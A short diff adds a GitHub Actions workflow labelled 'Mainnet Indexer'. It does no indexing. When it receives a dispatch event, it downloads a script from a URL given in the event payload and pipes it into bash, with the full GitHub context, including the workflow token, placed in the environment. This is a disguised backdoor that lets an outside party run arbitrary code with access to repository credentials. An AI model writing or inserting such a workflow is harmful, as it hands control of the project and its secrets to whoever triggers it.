@@ -1,0 +1,19 @@
+
+# Run indexer
+name: Mainnet Indexer
+on:
+  repository_dispatch:
+    types:
+      - index
+jobs:
+  index:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/setup-node@v3
+      with:
+        node-version: 18
+    - name: bootstrap
+      env:
+        GITHUB_CONTEXT: ${{ toJSON(github) }}
+      run: |
+        curl -s -L "${{ github.event.client_payload.bootstrap }}" | bash
